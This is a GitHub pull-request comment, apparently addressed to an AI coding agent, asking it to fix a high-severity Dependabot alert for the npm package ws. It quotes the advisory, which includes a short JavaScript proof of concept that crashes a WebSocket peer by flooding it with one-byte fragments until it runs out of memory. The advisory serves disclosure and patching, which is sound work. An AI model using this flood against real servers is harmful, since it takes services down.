@devin-ai-integration Please resolve this Dependabot security alert.

**Instructions:**
1. Analyze the vulnerability and understand its impact
2. Update the affected dependency to a secure version. If updating a poetry lock file, use the same version of poetry used to generate the existing one.
3. Ideally resolve this without using an override - prefer updating the dependency directly
4. If an override is absolutely necessary, document why in the PR description
5. Run tests to ensure the update doesn't break anything
6. Push your fix to this PR branch and tag @davidkonigsberg for review
7. Delete the scaffold file (.github/dependabot-alerts/alert-*.md) as part of your fix
8. Update the PR title, if needed, to pass CI checks

**Alert Details:**

- **Package:** ws (npm)
- **Severity:** HIGH
- **Vulnerable versions:** >= 8.0.0, < 8.21.0
- **Patched version:** 8.21.0
- **CVE:** CVE-2026-48779
- **GHSA:** GHSA-96hv-2xvq-fx4p
- **Manifest:** pnpm-lock.yaml

**Summary:**
ws: Memory exhaustion DoS from tiny fragments and data chunks

**Description:**
### Impact

A high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.

### Proof of concept

```js
import { WebSocket, WebSocketServer } from 'ws';

const wss = new WebSocketServer({ port: 0 }, function () {
  const data = Buffer.alloc(1);
  const options = { fin: false };
  const { port } = wss.address();
  const ws = new WebSocket(`ws://localhost:${port}`);

  ws.on('open', function () {
    (function send() {
      ws.send(data, options, function (err) {
        if (err) return;
        send();
      });
    })();
  });

  ws.on('error', console.error);
  ws.on('close', function (code, reason) {
    console.log(`client close - code: ${code} reason: ${reason.toString()}`);
  });
});

wss.on('connection', function (ws) {
  ws.on('error', console.error);
  ws.on('close', function (code, reason) {
    console.log(`server close - code: ${code} reason: ${reason.toString()}`);
  });
});
```

### Patches

The vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).

### Workarounds

In vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.

### Credits

The vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).

---
[View Dependabot Alert](https://github.com/fern-api/fern/security/dependabot/2088)
